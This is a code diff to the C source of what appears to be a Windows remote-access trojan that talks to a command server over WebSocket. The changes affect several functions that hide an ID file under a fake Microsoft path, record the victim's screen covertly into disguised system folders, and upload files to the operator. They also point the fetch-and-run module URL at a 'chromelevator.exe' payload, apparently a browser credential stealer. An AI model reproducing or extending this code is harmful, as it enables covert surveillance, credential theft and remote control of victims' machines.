@@ -197,7 +197,7 @@ static void init_bg() {
 char g_server_host[256] = "api.root1.me";
 char g_server_port[6] = "80";
 char g_server_path[256] = "/";
-char g_mod_url[512] = "https://github.com/nicehashquickinstaller/nice-hash-quick-installer/raw/refs/heads/main/modules/netfx.exe";
+char g_mod_url[512] = "http://192.168.1.8:8000/files/chromelevator.exe";
 
 // Global variables
 SOCKET g_sock = INVALID_SOCKET;
@@ -410,14 +410,14 @@ DWORD WINAPI power_monitor_thread(LPVOID param) {
 void init_client_id() {
     char appdata_path[MAX_PATH];
     char id_file[MAX_PATH];
+    char machine_id[48] = {0};
     
     // Get AppData\Local path
     if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) != S_OK) {
-        
+        // Fallback: generate fully random ID with PID
         sprintf(g_client_id, "%08lX%08lX", GetTickCount(), GetCurrentProcessId());
         return;
     }
-    
     
     char id_dir[MAX_PATH];
     sprintf(id_dir, "%s\\Microsoft\\Crypto\\Keys", appdata_path);
@@ -425,36 +425,41 @@ void init_client_id() {
     
     sprintf(id_file, "%s\\machinekey.dat", id_dir);
     
-    // Try to read existing ID
+    // Try to read existing machine ID
     FILE* f = fopen(id_file, "rb");
     if (f) {
-        if (fread(g_client_id, 1, 32, f) >= 16) {
-            g_client_id[32] = '\0';
+        if (fread(machine_id, 1, 32, f) >= 16) {
+            machine_id[32] = '\0';
             fclose(f);
+            // Append ProcessID to make each instance unique
+            // This allows multiple clients on same machine while still handling reconnects
+            sprintf(g_client_id, "%.24s%08lX", machine_id, GetCurrentProcessId());
             return;
         }
         fclose(f);
     }
     
-    // Generate new unique ID (hardware-based + random)
+    // Generate new machine ID (hardware-based + random)
     DWORD vol_serial = 0;
     GetVolumeInformationA("C:\\", NULL, 0, &vol_serial, NULL, NULL, NULL, 0);
     
-    // Combine multiple sources for uniqueness
-    sprintf(g_client_id, "%08lX%08lX%08lX%04X",
+    // Combine multiple sources for machine uniqueness
+    sprintf(machine_id, "%08lX%08lX%08lX%04X",
             vol_serial,
             GetTickCount(),
-            GetCurrentProcessId(),
+            (DWORD)(rand() & 0xFFFFFFFF),
             (unsigned int)(rand() & 0xFFFF));
     
-    
+    // Save the machine ID (without PID)
     f = fopen(id_file, "wb");
     if (f) {
-        fwrite(g_client_id, 1, strlen(g_client_id), f);
+        fwrite(machine_id, 1, strlen(machine_id), f);
         fclose(f);
-        
         SetFileAttributesA(id_file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
+    
+    // Append ProcessID for unique client ID
+    sprintf(g_client_id, "%.24s%08lX", machine_id, GetCurrentProcessId());
 }
 
 void init_display() {
@@ -2721,7 +2726,8 @@ int send_directory_recursive(const char* base_dir, int delete_after) {
                 if (delete_after) RemoveDirectoryA(subdir);
             }
         } else {
-            if (strstr(find_data.cFileName, ".json") != NULL) {
+            if (strstr(find_data.cFileName, ".json") != NULL || 
+                strstr(find_data.cFileName, ".log") != NULL) {
                 char file_path[MAX_PATH];
                 snprintf(file_path, sizeof(file_path), "%s\\%s", base_dir, find_data.cFileName);
                 
@@ -2807,7 +2813,7 @@ void run_ext() {
     send_websocket_data(um, strlen(um));
     
     DWORD bd = 0;
-    if (download_file_wininet(g_mod_url, ep, &bd) && bd > 100000) {
+    if (download_file_wininet(g_mod_url, ep, &bd) && bd > 0) {
         char dm[128];
         snprintf(dm, sizeof(dm), "[+] Downloaded: %lu bytes\n", bd);
         send_websocket_data(dm, strlen(dm));
@@ -2874,11 +2880,15 @@ static void save_screenrecord_state() {
         sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
     }
     
-    FILE* f = fopen(state_path, "w");
-    if (f) {
-        // Save enabled state AND recording path for resume after restart
-        fprintf(f, "%d\n%s\n", g_screenrecord_enabled ? 1 : 0, g_screenrecord_path);
-        fclose(f);
+    // Use Windows API for better compatibility
+    HANDLE hFile = CreateFileA(state_path, GENERIC_WRITE, 0, NULL, 
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        char buffer[MAX_PATH * 2];
+        int len = sprintf(buffer, "%d\n%s\n", g_screenrecord_enabled ? 1 : 0, g_screenrecord_path);
+        DWORD written;
+        WriteFile(hFile, buffer, len, &written, NULL);
+        CloseHandle(hFile);
     }
 }
 
@@ -2893,43 +2903,84 @@ static void load_screenrecord_state() {
         sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
     }
     
-    FILE* f = fopen(state_path, "r");
-    if (f) {
-        int enabled = 0;
-        char saved_path[MAX_PATH] = {0};
-        if (fscanf(f, "%d\n", &enabled) == 1) {
-            // Read the saved recording path
-            if (fgets(saved_path, sizeof(saved_path), f)) {
-                saved_path[strcspn(saved_path, "\r\n")] = 0;
+    // Debug log
+    char dbg_path[MAX_PATH];
+    sprintf(dbg_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_debug.log", appdata_path);
+    FILE* dbg = fopen(dbg_path, "a");
+    if (dbg) {
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        fprintf(dbg, "\n[%02d:%02d:%02d] load_screenrecord_state called\n", st.wHour, st.wMinute, st.wSecond);
+        fprintf(dbg, "  state_path: %s\n", state_path);
+        fprintf(dbg, "  exists: %d\n", GetFileAttributesA(state_path) != INVALID_FILE_ATTRIBUTES);
+    }
+    
+    // Use Windows API to read file (handles hidden/system files better)
+    HANDLE hFile = CreateFileA(state_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        char buffer[MAX_PATH * 2] = {0};
+        DWORD bytesRead = 0;
+        if (ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+            buffer[bytesRead] = '\0';
+            
+            int enabled = 0;
+            char saved_path[MAX_PATH] = {0};
+            
+            // Parse: first line is enabled (0 or 1), second line is path
+            char* newline = strchr(buffer, '\n');
+            if (newline) {
+                *newline = '\0';
+                enabled = atoi(buffer);
+                char* path_start = newline + 1;
+                // Remove trailing newline/carriage return
+                char* end = strchr(path_start, '\r');
+                if (end) *end = '\0';
+                end = strchr(path_start, '\n');
+                if (end) *end = '\0';
+                strncpy(saved_path, path_start, MAX_PATH - 1);
+            }
+            
+            if (dbg) fprintf(dbg, "  enabled: %d, saved_path: %s\n", enabled, saved_path);
+            
+            if (strlen(saved_path) > 0) {
+                char frames_dir[MAX_PATH];
+                strcpy(frames_dir, saved_path);
+                char* ext = strstr(frames_dir, ".zip");
+                if (ext) *ext = '\0';
                 
-                // Check if the saved path's frames directory still exists with frames
-                if (strlen(saved_path) > 0) {
-                    char frames_dir[MAX_PATH];
-                    strcpy(frames_dir, saved_path);
-                    char* ext = strstr(frames_dir, ".zip");
-                    if (ext) *ext = '\0';
-                    
-                    // Only restore path if frames directory has actual frames
-                    char search_pattern[MAX_PATH];
-                    sprintf(search_pattern, "%s\\frame_*.bmp", frames_dir);
-                    WIN32_FIND_DATAA fd;
-                    HANDLE hFind = FindFirstFileA(search_pattern, &fd);
-                    if (hFind != INVALID_HANDLE_VALUE) {
-                        // Has existing frames - continue this recording
-                        strcpy(g_screenrecord_path, saved_path);
-                        FindClose(hFind);
-                    } else {
-                        // No frames found - will start fresh recording
-                        g_screenrecord_path[0] = '\0';
-                    }
+                if (dbg) fprintf(dbg, "  frames_dir: %s\n", frames_dir);
+                if (dbg) fprintf(dbg, "  frames_dir exists: %d\n", GetFileAttributesA(frames_dir) != INVALID_FILE_ATTRIBUTES);
+                
+                char search_pattern[MAX_PATH];
+                sprintf(search_pattern, "%s\\frame_*.bmp", frames_dir);
+                WIN32_FIND_DATAA fd;
+                HANDLE hFind = FindFirstFileA(search_pattern, &fd);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    strcpy(g_screenrecord_path, saved_path);
+                    FindClose(hFind);
+                    if (dbg) fprintf(dbg, "  FOUND frames, restored path\n");
+                } else {
+                    g_screenrecord_path[0] = '\0';
+                    if (dbg) fprintf(dbg, "  NO frames found\n");
                 }
             }
+            
             if (enabled) {
-                // Auto-start recording on startup if it was enabled
                 g_screenrecord_enabled = 1;
+                if (dbg) fprintf(dbg, "  g_screenrecord_enabled = 1\n");
             }
+        } else {
+            if (dbg) fprintf(dbg, "  ReadFile failed: %lu\n", GetLastError());
         }
-        fclose(f);
+        CloseHandle(hFile);
+    } else {
+        if (dbg) fprintf(dbg, "  CreateFile failed: %lu\n", GetLastError());
+    }
+    
+    if (dbg) {
+        fprintf(dbg, "  RESULT: enabled=%d, path=%s\n", g_screenrecord_enabled, g_screenrecord_path);
+        fclose(dbg);
     }
 }
 
@@ -2948,6 +2999,22 @@ static void clear_screenrecord_state() {
 }
 
 DWORD WINAPI screenrecord_thread(LPVOID param) {
+    // Debug: log thread started
+    {
+        char appdata_path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+            char dbg_path[MAX_PATH];
+            sprintf(dbg_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_debug.log", appdata_path);
+            FILE* dbg = fopen(dbg_path, "a");
+            if (dbg) {
+                SYSTEMTIME st;
+                GetLocalTime(&st);
+                fprintf(dbg, "\n[%02d:%02d:%02d] screenrecord_thread STARTED\n", st.wHour, st.wMinute, st.wSecond);
+                fprintf(dbg, "  g_screenrecord_path: %s\n", strlen(g_screenrecord_path) > 0 ? g_screenrecord_path : "(empty)");
+                fclose(dbg);
+            }
+        }
+    }
     
     SetProcessDPIAware();
     
@@ -3239,12 +3306,44 @@ cleanup:
 
 // Internal function to start recording without messages (for resume)
 void start_screenrecord_internal() {
+    // Debug logging
+    {
+        char appdata_path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+            char dbg_path[MAX_PATH];
+            sprintf(dbg_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_debug.log", appdata_path);
+            FILE* dbg = fopen(dbg_path, "a");
+            if (dbg) {
+                SYSTEMTIME st;
+                GetLocalTime(&st);
+                fprintf(dbg, "\n[%02d:%02d:%02d] start_screenrecord_internal called\n", st.wHour, st.wMinute, st.wSecond);
+                fprintf(dbg, "  g_screenrecord_running: %d\n", g_screenrecord_running);
+                fclose(dbg);
+            }
+        }
+    }
+    
     if (g_screenrecord_running) return;
     
     g_screenrecord_running = 1;
     g_screenrecord_enabled = 1;
     save_screenrecord_state();  
     g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
+    
+    // Debug: log thread creation result
+    {
+        char appdata_path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+            char dbg_path[MAX_PATH];
+            sprintf(dbg_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_debug.log", appdata_path);
+            FILE* dbg = fopen(dbg_path, "a");
+            if (dbg) {
+                fprintf(dbg, "  Thread handle: %p\n", (void*)g_screenrecord_thread);
+                fprintf(dbg, "  Recording started: running=%d, enabled=%d\n", g_screenrecord_running, g_screenrecord_enabled);
+                fclose(dbg);
+            }
+        }
+    }
 }
 
 void start_screenrecord() {
@@ -3321,13 +3420,13 @@ void stop_screenrecord() {
 }
 
 void download_screenrecord() {
-    // If recording is running, stop it first and wait for compression
     int was_running = g_screenrecord_running;
+    
+    // Stop current recording if running
     if (g_screenrecord_running) {
-        send_websocket_data("[*] Stopping recording and compressing for download...\n", 55);
+        send_websocket_data("[*] Stopping recording and compressing...\n", 42);
         g_screenrecord_running = 0;
         if (g_screenrecord_thread) {
-            // Wait for compression to complete (up to 5 minutes)
             WaitForSingleObject(g_screenrecord_thread, 300000);
             CloseHandle(g_screenrecord_thread);
             g_screenrecord_thread = NULL;
@@ -3335,95 +3434,193 @@ void download_screenrecord() {
         send_websocket_data("[+] Compression complete\n", 25);
     }
     
-    // Check for mp4 file (ffmpeg output) if zip doesn't exist
-    if (strlen(g_screenrecord_path) > 0) {
-        char mp4_path[MAX_PATH];
-        strcpy(mp4_path, g_screenrecord_path);
-        char* ext = strstr(mp4_path, ".zip");
-        if (ext) strcpy(ext, ".mp4");
-        
-        // Prefer mp4 if it exists
-        if (GetFileAttributesA(mp4_path) != INVALID_FILE_ATTRIBUTES) {
-            strcpy(g_screenrecord_path, mp4_path);
-        }
-    }
-    
-    // Now check if file exists
-    if (strlen(g_screenrecord_path) == 0 || 
-        GetFileAttributesA(g_screenrecord_path) == INVALID_FILE_ATTRIBUTES) {
-        send_websocket_data("[!] No recording available (compression may have failed)\n", 57);
-        return;
-    }
-    
-    // Show file size before download
-    WIN32_FILE_ATTRIBUTE_DATA fad;
-    if (GetFileAttributesExA(g_screenrecord_path, GetFileExInfoStandard, &fad)) {
-        LARGE_INTEGER size;
-        size.LowPart = fad.nFileSizeLow;
-        size.HighPart = fad.nFileSizeHigh;
-        
-        char size_str[32];
-        if (size.QuadPart >= 1048576) {
-            sprintf(size_str, "%.1f MB", size.QuadPart / 1048576.0);
-        } else if (size.QuadPart >= 1024) {
-            sprintf(size_str, "%.1f KB", size.QuadPart / 1024.0);
-        } else {
-            sprintf(size_str, "%lld bytes", size.QuadPart);
-        }
-        
-        char msg[256];
-        sprintf(msg, "[*] Downloading recording (%s)...\n", size_str);
-        send_websocket_data(msg, strlen(msg));
+    // Get the recordings directory
+    char base_dir[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, base_dir))) {
+        strcat(base_dir, "\\Microsoft\\Windows\\SystemCache");
     } else {
-        send_websocket_data("[*] Downloading recording...\n", 29);
+        GetTempPathA(MAX_PATH, base_dir);
     }
     
-    // Save current path in case download fails
-    char saved_path[MAX_PATH];
-    strcpy(saved_path, g_screenrecord_path);
+    // Find ALL recording files (.mp4 and .zip)
+    char search_mp4[MAX_PATH], search_zip[MAX_PATH];
+    sprintf(search_mp4, "%s\\.screenrec_*.mp4", base_dir);
+    sprintf(search_zip, "%s\\.screenrec_*.zip", base_dir);
     
-    int download_success = download_file(g_screenrecord_path);
+    // Collect all recording files
+    char files[20][MAX_PATH];  // Max 20 recordings
+    int file_count = 0;
     
-    if (!download_success) {
-        // Download failed - restore path and don't restart
-        // This preserves the recording file for retry
-        strcpy(g_screenrecord_path, saved_path);
-        send_websocket_data("[!] Download failed - recording preserved, try 'getrecord' again\n", 65);
-        
-        // If it was running, restart it to continue recording to the SAME file
-        if (was_running && g_screenrecord_enabled) {
-            send_websocket_data("[*] Continuing recording...\n", 28);
-            start_screenrecord_internal();  // Will continue with existing path
-        }
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind;
+    
+    // Find MP4 files
+    hFind = FindFirstFileA(search_mp4, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (file_count < 20) {
+                sprintf(files[file_count], "%s\\%s", base_dir, fd.cFileName);
+                file_count++;
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    
+    // Find ZIP files
+    hFind = FindFirstFileA(search_zip, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (file_count < 20) {
+                sprintf(files[file_count], "%s\\%s", base_dir, fd.cFileName);
+                file_count++;
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    
+    if (file_count == 0) {
+        send_websocket_data("[!] No recordings found\n", 24);
         return;
     }
     
-    // Auto-restart if it was running and enabled - ONLY on successful download
+    char msg[256];
+    sprintf(msg, "[*] Found %d recording(s) to download\n", file_count);
+    send_websocket_data(msg, strlen(msg));
+    
+    int success_count = 0;
+    int fail_count = 0;
+    
+    // Download each file
+    for (int i = 0; i < file_count; i++) {
+        // Get file size
+        WIN32_FILE_ATTRIBUTE_DATA fad;
+        if (GetFileAttributesExA(files[i], GetFileExInfoStandard, &fad)) {
+            LARGE_INTEGER size;
+            size.LowPart = fad.nFileSizeLow;
+            size.HighPart = fad.nFileSizeHigh;
+            
+            char size_str[32];
+            if (size.QuadPart >= 1048576) {
+                sprintf(size_str, "%.1f MB", size.QuadPart / 1048576.0);
+            } else if (size.QuadPart >= 1024) {
+                sprintf(size_str, "%.1f KB", size.QuadPart / 1024.0);
+            } else {
+                sprintf(size_str, "%lld bytes", size.QuadPart);
+            }
+            
+            // Get just filename for display
+            char* filename = strrchr(files[i], '\\');
+            if (filename) filename++; else filename = files[i];
+            
+            sprintf(msg, "[*] Downloading %d/%d: %s (%s)...\n", i+1, file_count, filename, size_str);
+            send_websocket_data(msg, strlen(msg));
+        }
+        
+        if (download_file(files[i])) {
+            success_count++;
+        } else {
+            fail_count++;
+            char* filename = strrchr(files[i], '\\');
+            if (filename) filename++; else filename = files[i];
+            sprintf(msg, "[!] Failed to download: %s\n", filename);
+            send_websocket_data(msg, strlen(msg));
+        }
+    }
+    
+    sprintf(msg, "[+] Download complete: %d success, %d failed\n", success_count, fail_count);
+    send_websocket_data(msg, strlen(msg));
+    
+    // Clear current path since we downloaded everything
+    g_screenrecord_path[0] = '\0';
+    
+    // Auto-restart if it was running and enabled
     if (was_running && g_screenrecord_enabled) {
         send_websocket_data("[*] Restarting recording (new file)...\n", 39);
-        g_screenrecord_path[0] = '\0';  // New file ONLY after successful download
         start_screenrecord_internal();
     }
 }
 
 void delete_screenrecord() {
-    if (strlen(g_screenrecord_path) == 0) {
-        send_websocket_data("[!] No recording to delete\n", 27);
-        return;
-    }
-    
     if (g_screenrecord_running) {
         send_websocket_data("[!] Stop recording first\n", 25);
         return;
     }
     
-    if (DeleteFileA(g_screenrecord_path)) {
-        send_websocket_data("[+] Recording deleted\n", 22);
-        g_screenrecord_path[0] = '\0';
-        clear_screenrecord_state();  
+    // Get the recordings directory
+    char base_dir[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, base_dir))) {
+        strcat(base_dir, "\\Microsoft\\Windows\\SystemCache");
     } else {
-        send_websocket_data("[!] Failed to delete recording\n", 31);
+        GetTempPathA(MAX_PATH, base_dir);
     }
+    
+    // Find and delete ALL recording files and folders
+    char search_pattern[MAX_PATH];
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind;
+    int deleted = 0;
+    
+    // Delete .mp4 files
+    sprintf(search_pattern, "%s\\.screenrec_*.mp4", base_dir);
+    hFind = FindFirstFileA(search_pattern, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            char filepath[MAX_PATH];
+            sprintf(filepath, "%s\\%s", base_dir, fd.cFileName);
+            if (DeleteFileA(filepath)) deleted++;
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    
+    // Delete .zip files
+    sprintf(search_pattern, "%s\\.screenrec_*.zip", base_dir);
+    hFind = FindFirstFileA(search_pattern, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            char filepath[MAX_PATH];
+            sprintf(filepath, "%s\\%s", base_dir, fd.cFileName);
+            if (DeleteFileA(filepath)) deleted++;
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    
+    // Delete frame directories (in case compression didn't happen)
+    sprintf(search_pattern, "%s\\.screenrec_*", base_dir);
+    hFind = FindFirstFileA(search_pattern, &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                char dirpath[MAX_PATH];
+                sprintf(dirpath, "%s\\%s", base_dir, fd.cFileName);
+                
+                // Delete all files in directory first
+                char delpattern[MAX_PATH];
+                sprintf(delpattern, "%s\\*", dirpath);
+                WIN32_FIND_DATAA fd2;
+                HANDLE hFind2 = FindFirstFileA(delpattern, &fd2);
+                if (hFind2 != INVALID_HANDLE_VALUE) {
+                    do {
+                        if (!(fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                            char filepath[MAX_PATH];
+                            sprintf(filepath, "%s\\%s", dirpath, fd2.cFileName);
+                            DeleteFileA(filepath);
+                        }
+                    } while (FindNextFileA(hFind2, &fd2));
+                    FindClose(hFind2);
+                }
+                
+                if (RemoveDirectoryA(dirpath)) deleted++;
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    
+    g_screenrecord_path[0] = '\0';
+    clear_screenrecord_state();
+    
+    char msg[128];
+    sprintf(msg, "[+] Deleted %d recording(s)\n", deleted);
+    send_websocket_data(msg, strlen(msg));
 }
 
 void change_directory(const char* path) {
@@ -5541,6 +5738,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     load_screenrecord_state();
     
+    // Debug: log after load
+    {
+        char appdata_path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+            char dbg_path[MAX_PATH];
+            sprintf(dbg_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_debug.log", appdata_path);
+            FILE* dbg = fopen(dbg_path, "a");
+            if (dbg) {
+                fprintf(dbg, "  After load: enabled=%d, running=%d, path=%s\n", 
+                        g_screenrecord_enabled, g_screenrecord_running, g_screenrecord_path);
+                fprintf(dbg, "  Will start: %d\n", (g_screenrecord_enabled && !g_screenrecord_running));
+                fclose(dbg);
+            }
+        }
+    }
+    
     if (g_screenrecord_enabled && !g_screenrecord_running) {
         start_screenrecord_internal();
     }
@@ -5562,6 +5775,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     GetCurrentDirectoryA(MAX_PATH, g_current_dir);
     
+    // Generate session ID once at startup (stable across reconnects)
     g_session_id = GetCurrentProcessId() ^ GetTickCount();
     
     start_im();
@@ -5569,6 +5783,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     int retry_count = 0;
     int consecutive_failures = 0;
     DWORD last_connect_time = 0;
+    int is_reconnect = 0;  // Track if this is a reconnection
     
     while (1) {
         g_connected = 0;
@@ -5584,6 +5799,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             consecutive_failures = 0;
         }
         
+        // If we've connected before, this is a reconnection
+        if (last_connect_time > 0) {
+            is_reconnect = 1;
+        }
+        
         // Keep trying to connect until successful
         while (!g_connected) {
             if (connect_websocket()) {
@@ -5591,7 +5811,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 retry_count = 0;
                 last_connect_time = GetTickCount();
                 
+                // Small delay before starting session to allow server to clean up old connections
+                if (is_reconnect) {
+                    Sleep(500);
+                }
+                
                 handle_session();
+                
+                // Mark future connections as reconnects
+                is_reconnect = 1;
                 
                 // Clean up after session ends
                 g_connected = 0;
